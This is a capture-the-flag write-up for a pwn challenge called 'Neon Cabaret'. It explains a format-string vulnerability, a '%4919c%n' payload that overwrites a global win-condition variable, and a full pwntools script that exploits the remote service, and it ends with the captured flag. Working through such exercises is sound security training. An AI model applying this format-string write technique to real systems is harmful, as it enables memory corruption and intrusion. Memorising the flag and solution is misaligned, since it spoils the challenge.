---
title: "Neon Cabaret"
ctf: "Safaricom CTF"
date: 2026-10-06
category: pwn
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "Strawhats"
---

# Neon Cabaret

> **Category:** PWN · **Points:** 300 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

- **Remote:** `nc 54.72.82.22 8740` — banner `Neon Cabaret. Guest line:`
- **Desk page:** http://54.72.82.22:8610/
- **Binary:** http://54.72.82.22:8610/downloads/receipt (raw ELF, no extension)
  - sha256 `360bbeffbc19859124f76ee0ebdc2136f81cbe4305518db4ef49ef53573446a3`
  - x86-64 ELF EXEC, stripped, dynamically linked (keep out of git — `.gitignore`)

## Protections
| PIE | Canary | NX | RELRO |
|-----|--------|----|-------|
| No  | No     | Yes| Partial |

## Bug
Stripped. Entry `0x401090` -> `__libc_start_main(main=0x4011db)`.

`main` (0x4011db):
1. `setbuf(stdout, NULL)`
2. `puts("Neon Cabaret. Guest line:")`
3. `fgets(buf[0x200], 0x200, stdin)`
4. `printf(buf, 0x40405c)`  ← **user input used as format string**
5. `if (*(uint32_t*)0x40405c == 0x1337) win();`
6. `win` (0x401176): `fopen("/run/receipt","r")` -> `fgets(0xa0)` -> `puts()` → prints the flag.

`rsi` and `rdx` are both loaded with `0x40405c` at the printf call
(`lea rdx,[rip+0x2e1e]` = 0x40405c; `mov rsi,rdx`), so the first *two*
printf varargs are the address of the win-condition dword.

## Verification
- Local: `echo '%p.%p' | ./receipt.bin` prints `0x40405c.0x40405c` → confirms
  format-string bug and that arg1 == arg2 == 0x40405c.
- Win target = global dword at `0x40405c` in `.bss` (adjacent to `stdin@COPY`
  at 0x404050 and the `__bss` guard byte at 0x404058).

## Technique — one-shot format-string write
Payload: `%4919c%n`
- `%4919c` consumes arg1 (`rsi = 0x40405c`), printing 4919 chars.
- `%n` consumes arg2 (`rdx = 0x40405c`), writing 4919 = `0x1337` to it.
- Check passes → `win()` reads `/run/receipt` and prints the flag.

No GOT overwrite needed — the win condition is a plain writable global, and
`%n`'s implicit first-arg pointer already targets it.

## Attempts
1. Triage hint (format string) confirmed immediately with `%p` — no fallback needed.
2. `%4919c%n` → flag on first remote attempt.

## Reproduce
`/home/nomad/safaricom_ctf/.venv/bin/python solve.py`

## Solve script

`pwn/neon-cabaret/solve.py`:

```python
#!/usr/bin/env python3
"""
Neon Cabaret (pwn) - Safaricom CTF
==================================
Remote: nc 54.72.82.22 8740   ("Neon Cabaret. Guest line:")
Binary: http://54.72.82.22:8610/downloads/receipt  (raw ELF, no ext)
        sha256 360bbeffbc19859124f76ee0ebdc2136f81cbe4305518db4ef49ef53573446a3

Bug
---
main() does:

    printf(user_buf, 0x40405c);        # <- user-controlled format string
    if (*(u32*)0x40405c == 0x1337)     # win condition (global dword)
        win();                         # fopen("/run/receipt","r"); fgets; puts  -> FLAG

rsi and rdx both hold 0x40405c at the printf() call, so the first two
varargs of printf point straight at the win-condition dword.

Technique
---------
Single-shot format string write:  "%4919c%n"
  * %4919c  consumes arg1 (rsi = 0x40405c) and prints 4919 chars.
  * %n      consumes arg2 (rdx = 0x40405c) and writes 4919 = 0x1337 to it.
Check passes -> win() reads /run/receipt and prints the flag.

No PIE, no canary, partial RELRO, NX enabled -> classic GOT/global overwrite.
"""
from pwn import context, remote

HOST, PORT = "54.72.82.22", 8740
WIN_OFF = 0x40405C          # global dword checked against 0x1337
WANT = 0x1337               # 4919


def main():
    context.log_level = "info"
    payload = b"%4919c%n"   # 4919 == 0x1337 == WANT

    r = remote(HOST, PORT)
    r.recvuntil(b"Guest line:\n", timeout=5)
    r.sendline(payload)
    data = r.recvall(timeout=10)
    r.close()

    import re
    m = re.search(rb"safctf\{[0-9a-fA-F]{32}\}", data)
    if m:
        print(m.group(0).decode())
    else:
        print("no flag found, raw tail:", data[-400:])


if __name__ == "__main__":
    main()
```

## Tools

**Used in this solve:**

- pwntools
- Python 3 (solver)

**Other tools that fit this category:**

- pwntools (exploit dev)
- GDB + pwndbg/GEF
- Ghidra / IDA (static)
- radare2 / rizin
- ROPgadget / ropper
- one_gadget
- checksec, patchelf

## Flag

```
safctf{c6d2ec6a705f9a51db0be634224d3358}
```
